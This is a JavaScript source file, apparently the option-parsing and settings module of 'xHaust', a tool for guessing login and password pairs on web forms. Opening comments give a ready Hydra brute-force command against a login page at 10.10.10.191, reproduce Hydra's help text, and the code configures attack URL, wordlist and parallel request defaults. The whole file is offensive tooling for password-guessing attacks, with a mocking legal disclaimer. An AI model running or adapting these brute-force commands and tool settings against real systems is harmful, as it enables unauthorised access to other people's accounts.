// hydra -l fergus -P 10-million-password-list-top-1000000.txt 10.10.10.191 http-post-form
// "/admin/login:username=^USER^&password=^PASS^&save=:Login:Login Failed" -v
const { program } = require('commander')
const packagejson = require('../package.json')
const url = require('url')
const colorize = require('json-colorizer')

// Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

// Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

// Options:
//   -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
//   -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
//   -C FILE   colon separated "login:pass" format, instead of -L/-P options
//   -M FILE   list of servers to attack, one entry per line, ':' to specify port
//   -t TASKS  run TASKS number of connects in parallel per target (default: 16)
//   -U        service module usage details
//   -m OPT    options specific for a module, see -U output for information
//   -h        more command line options (COMPLETE HELP)
//   server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
//   service   the service to crack (see below for supported protocols)
//   OPT       some service modules support additional input (-U for module help)

// Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

// Example:  hydra -l user -P passlist.txt ftp://192.168.0.1

module.exports = class Commander extends require('../classes/package') {
	constructor() {
		super()
	}

	async apply() {
		const userSettings = await this.query()
		const defaultSettings = {
			maxParallelLimit: 110,
			batchSize: 1000,
			htmlEncoding: 'utf8',
			retry: {
				times: 9,
				interval: function (retryCount) {
					return 50 * Math.pow(2, retryCount)
				}
			},
			attackUrl: 'http://10.10.10.191/admin/login',
			wordlist: '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt',
			prettyError: true,
			payload: '',
			removeQueueEvery: 10000,
			attackType: 'http-post-urlencoded',
			useGui: false
		}

		// Merge default and user settings
		this.xhaust.settings = Object.assign({}, defaultSettings, userSettings)

		// create hostname and path from attackurl
		const parse = url.parse(this.xhaust.settings.attackUrl)
		this.xhaust.settings.attackHostname = parse.hostname
		this.xhaust.settings.attackPath = parse.path

		// pretty error if wanted
		if (this.xhaust.settings.prettyError) {
			require('pretty-error').start()
		}

		// define our attack types
		this.xhaust.settings.attackTypes = this.xhaust.settings.attackType.split('-')
	}

	prettyPrint() {
		return console.log(colorize(JSON.stringify(this.xhaust.settings, null, 3)))
	}

	printFooter() {
		console.log(`\n\n
  xHaust is a tool to guess/crack valid login/password pairs.
  Licensed under Massachusetts Institute of Technology (MIT) License. 
  The newest version is always available at: https://github.com/givemeallyourcats/xhaust
  Please don't use in military or secret service organizations, or for illegal purposes. 😆`)
	}

	async query() {
		program.version(packagejson.version)
		program.exitOverride()

		program.on('--help', () => {
			console.log('')
			console.log('Example call:')
			console.log('  $ xhaust -u http://10.10.10.191/admin/login')
		})
		program.requiredOption('-a, --attackUrl <attackUrl>', 'url where the form resides')
		program.requiredOption('-w, --wordlist <wordlist>', 'wordlist file to use')
		program.requiredOption('-t, --typeAttack <typeAttack>', 'type of attack, example: "http-post-urlencoded"')
		program.option('-p, --payload <payload>', 'payload of attack')
		program.option('-l, --limitParallel <limitParallel>', 'max parallel requests at a time')
		program.option('-s, --batchSize <batchSize>', 'the get and post requests batch size')
		program.option('-g, --useGui', 'enable gui')
		program.option('-e, --prettyError', 'enables pretty exceptions, so relaxing')

		try {
			program.parse(process.argv)
		} catch (err) {
			if (err.code === 'commander.unknownOption' || err.code == 'commander.missingMandatoryOptionValue') {
				console.log('\n')
				this.pretty.warn(err.toString())
				program.outputHelp()
				this.printFooter()
				process.exit()
			}
		}

		const output = {}

		if (program.limitParallel) output.limitParallel = program.limitParallel
		if (program.batchSize) output.batchSize = program.batchSize
		if (program.attackUrl) output.attackUrl = program.attackUrl
		if (program.typeAttack) output.typeAttack = program.typeAttack
		if (program.payload) output.payload = program.payload
		if (program.wordlist) output.wordlist = program.wordlist
		if (program.useGui) output.useGui = program.useGui
		if (program.prettyError) output.prettyError = false

		return output
	}
}
